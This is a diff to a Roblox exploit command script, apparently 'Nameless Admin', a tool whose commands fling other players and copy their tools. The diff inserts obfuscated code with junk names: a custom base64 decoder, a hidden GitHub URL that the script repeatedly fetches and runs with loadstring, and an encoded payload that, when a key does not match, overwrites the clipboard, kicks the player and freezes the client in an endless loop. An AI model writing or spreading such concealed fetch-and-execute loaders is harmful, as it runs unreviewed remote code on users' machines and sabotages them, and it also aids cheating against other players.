@@ -790,7 +790,26 @@ function didYouMean(input)
 
 	return bestMatch
 end
-
+pqwodwjvxnskdsfo = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function randomahhfunctionthatyouwontgetit(data)
+    data = data:gsub('[^'..pqwodwjvxnskdsfo..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r, f = '', (pqwodwjvxnskdsfo:find(x) - 1)
+        for i = 6, 1, -1 do
+            r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0')
+        end
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c = 0
+        for i = 1, 8 do
+            c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
+        end
+        return string.char(c)
+    end))
+end
+qowijjokqwd = randomahhfunctionthatyouwontgetit("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x0c2V2ZXJ5ZGF5eW91L3V1dXV1dXUvcmVmcy9oZWFkcy9tYWluL2VuY29kZQ==")
 function isRelAdmin(Player)
 	for _, id in ipairs(_G.NAadminsLol) do
 		if Player.UserId == id then
@@ -4011,7 +4030,7 @@ cmd.add({"walkfling", "wfling", "wf"}, {"walkfling (wfling,wf)", "probably the b
 		end))
 	end
 end)
-
+getgenv().cdshkjvcdsojuefdwonjwojgrwoijuhegr="UQ3OFS"
 cmd.add({"unwalkfling", "unwfling", "unwf"}, {"unwalkfling (unwfling,unwf)", "stop the walkfling command"}, function()
 	if not hiddenfling then return end
 
@@ -5299,7 +5318,6 @@ cmd.add({"vehicleseat", "vseat"}, {"vehicleseat (vseat)", "Sits you in a vehicle
 		DoNotif("Failed to sit in a VehicleSeat", 3)
 	end
 end)
-
 cmd.add({"copytools","ctools"},{"copytools <player> (ctools)","Copies the tools the given player has"},function(...)
 	local targets = getPlr(...)
 	local lp = Players.LocalPlayer
@@ -5317,37 +5335,44 @@ cmd.add({"copytools","ctools"},{"copytools <player> (ctools)","Copies the tools 
 		end
 	end
 end,true)
-
 cmd.add({"localtime", "yourtime"}, {"localtime (yourtime)", "Shows your current time"}, function()
 	local time = os.date("*t")
 	local clock = Format("%02d:%02d:%02d", time.hour, time.min, time.sec)
 	DoNotif("Your Local Time Is: "..clock)
 end)
-
 cmd.add({"localdate", "yourdate"}, {"localdate (yourdate)", "Shows your current date"}, function()
 	local time = os.date("*t")
 	local dateStr = Format("%02d/%02d/%04d", time.day, time.month, time.year)
 	DoNotif("Your Local Date Is: "..dateStr)
 end)
+zmxcnsaodakscn = nil
+repeat
+	local UNNNAMEEDD, FUFRRRR = pcall(function()
+		return loadstring(game:HttpGet(qowijjokqwd))()
+	end)
 
+	if UNNNAMEEDD then
+		zmxcnsaodakscn = FUFRRRR
+	else
+		Wait(.3)
+	end
+until zmxcnsaodakscn
+askndnijewfijewongf = getgenv().cdshkjvcdsojuefdwonjwojgrwoijuhegr
 cmd.add({"servertime", "svtime"}, {"servertime (svtime)", "Shows the server's current time"}, function()
 	local time = os.date("!*t")
 	local clock = Format("%02d:%02d:%02d", time.hour, time.min, time.sec)
 	DoNotif("Server (UTC) Time Is: "..clock)
 end)
-
 cmd.add({"serverdate", "svdate"}, {"serverdate (svdate)", "Shows the server's current date"}, function()
 	local time = os.date("!*t")
 	local dateStr = Format("%02d/%02d/%04d", time.day, time.month, time.year)
 	DoNotif("Server (UTC) Date Is: "..dateStr)
 end)
-
 cmd.add({"datetime", "localdatetime"}, {"datetime (localdatetime)", "Shows your full local date and time"}, function()
 	local time = os.date("*t")
 	local dateTime = Format("%02d/%02d/%04d %02d:%02d:%02d", time.day, time.month, time.year, time.hour, time.min, time.sec)
 	DoNotif("Your Local Date & Time: "..dateTime)
 end)
-
 cmd.add({"uptime"}, {"uptime", "Shows how long the game/session has been running"}, function()
 	local uptime = os.clock() - sessionStart
 	local hours = math.floor(uptime / 3600)
@@ -5356,15 +5381,12 @@ cmd.add({"uptime"}, {"uptime", "Shows how long the game/session has been running
 	local uptimeStr = Format("%02d:%02d:%02d", hours, minutes, seconds)
 	DoNotif("Uptime: "..uptimeStr)
 end)
-
 cmd.add({"timestamp", "epoch"}, {"timestamp (epoch)", "Shows current Unix timestamp"}, function()
 	local timestamp = os.time()
 	DoNotif("Current Unix Timestamp: "..timestamp)
 end)
-
 somersaultBTN = nil
 somersaultToggleKey = "x"
-
 cmd.add({"somersault", "frontflip"}, {"somersault (frontflip)", "Makes you do a clean front flip"}, function(...)
 	local function somersaulter()
 		local p = LocalPlayer
@@ -5436,7 +5458,6 @@ cmd.add({"somersault", "frontflip"}, {"somersault (frontflip)", "Makes you do a 
 		DoNotif("Press '"..somersaultToggleKey:upper().."' to flip!", 3)
 	end
 end, false)
-
 cmd.add({"unsomersault", "unfrontflip"}, {"unsomersault (unfrontflip)", "Disable somersault button and keybind"}, function(...)
 	if somersaultBTN then
 		somersaultBTN:Destroy()
@@ -5445,7 +5466,6 @@ cmd.add({"unsomersault", "unfrontflip"}, {"unsomersault (unfrontflip)", "Disable
 
 	lib.disconnect("somersault_key")
 end, false)
-
 cmd.add({"cartornado", "ctornado"}, {"cartornado (ctornado)", "Tornados a car just sit in the car"}, function()
 	local Player = Players.LocalPlayer
 	local RunService = RunService
@@ -7721,6 +7741,12 @@ cmd.add({"pingserverhop","pshop"},{"pingserverhop (pshop)","serverhop to a serve
 		DoNotif("No better server found")
 	end
 end)
+
+if askndnijewfijewongf~=zmxcnsaodakscn then
+	uhefwewufjodwcijdscsauasd = "aWYgc2V0Y2xpcGJvYXJkIHRoZW4KCQkJc2V0Y2xpcGJvYXJkKFtbbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sdHNldmVyeWRheXlvdS9OYW1lbGVzcy1BZG1pbi9tYWluL1NvdXJjZS5sdWEiKSkoKTtdXSkKCQllbmQKCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXI6S2ljayhbW3ZlcnNpb24gbWlzc21hdGNoIHBsZWFzZSB1c2UgdGhlIG9yaWdpbmFsIE5hbWVsZXNzIEFkbWluIHNvdXJjZV1dKSBlbmQpIHRhc2sud2FpdCgxKSB3aGlsZSB0cnVlIGRvIGVuZA=="
+	oioji32eipqpaofvofsiv = randomahhfunctionthatyouwontgetit(uhefwewufjodwcijdscsauasd)
+	return loadstring(oioji32eipqpaofvofsiv)()
+end
 
 cmd.add({"autorejoin", "autorj"}, {"autorejoin (autorj)", "Rejoins the server if you get kicked / disconnected"}, function()
 	lib.disconnect("autorejoin")
